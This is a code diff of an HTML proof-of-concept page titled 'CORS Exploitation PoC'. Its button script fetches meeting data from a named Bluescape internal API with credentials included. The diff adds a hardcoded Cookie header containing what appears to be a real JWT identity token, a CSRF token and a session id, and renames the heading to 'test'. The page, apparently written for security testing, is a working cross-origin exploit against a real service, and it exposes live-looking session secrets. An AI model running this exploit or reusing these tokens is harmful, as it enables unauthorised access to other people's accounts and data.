@@ -5,7 +5,7 @@
     <title>CORS Exploitation PoC</title>
 </head>
 <body>
-    <h1>CORS Exploitation PoC</h1>
+    <h1>test</h1>
     <button id="exploitButton">Exploit CORS</button>
     <pre id="response"></pre>
 
@@ -13,7 +13,10 @@
         document.getElementById('exploitButton').onclick = function() {
             fetch('https://uc-connector.intprod.bluescape.io/api/v3/chime/meetings?workspaceId=mcYcTPPos-jN34ZXWKhC', {
                 method: 'GET',
-                credentials: 'include'  // This sends cookies along with the request
+                credentials: 'include',  // This sends cookies along with the request
+                headers: {
+                    'Cookie': 'idToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImswIn0.eyJleHAiOjE3MjYwNDc3NjUsInNwaWQiOm51bGwsIm1mYSI6bnVsbCwibmJmIjoxNzI0ODM4MTU1LCJpYXQiOjE3MjQ4MzgxNjUsImp0aSI6InVoSDhabE04NUw2MktsVHp4cllWeUt6M2tRZHNkdWdfQURJMFhFLWVwUmgyWkNXSiIsInN1YiI6IlFvNW9Yc2syY193bWhNVUJpZkJ6IiwidXNlclR5cGUiOiJyZWdpc3RlcmVkIiwiYXVkIjpbImlzYW1kbmpKc2tqR0c0RHplZDJadklkVFhTQThuRFU2NFBLc2EiLCIzNmY4Y2Y1MTc1ZTRmYWFhNGYwNjcxODQwNGI3ZGY5NGRkYzBkOGFlIiwiMDE1ZjQ4MWFjZmU0MDJjOWJhZTQzNTM4OWVmYmI2OTE0OTI5Y2U5ZCIsIjAxNWY0ODFhY2ZlNDAyYzliYWU0MzUzODllZmJiNjkxNDkyOWJmOGMiLCJWSkJ0aWFKZG5qSi1rakdHNER6ZWQyWnZJZFRYU0E4bkRVNjRQSzBjIiwid3NzaXplcmtuakpza2pHRzREemVkMlpTQThuRFU2NFBLZmkiXSwiaXNzIjoiaHR0cHM6Ly9pZGVudGl0eS1hcGkuaW50cHJvZC5ibHVlc2NhcGUuaW8ifQ.W7LRPvU9R7LW5siKMYugeUd_6E9QwPH8UB-JnoVMl0g; _csrf=S0BSDXW0rkO4byooE_rHgrsb; elementary.sid=s%3A66d043a2e3b5c742f735f9ce.NZyp%2ByD7CdmsdRJT4f2Njgd9MaKm9BUXQIctB8oZrCQ'
+                }
             })
             .then(response => response.text())
             .then(data => {
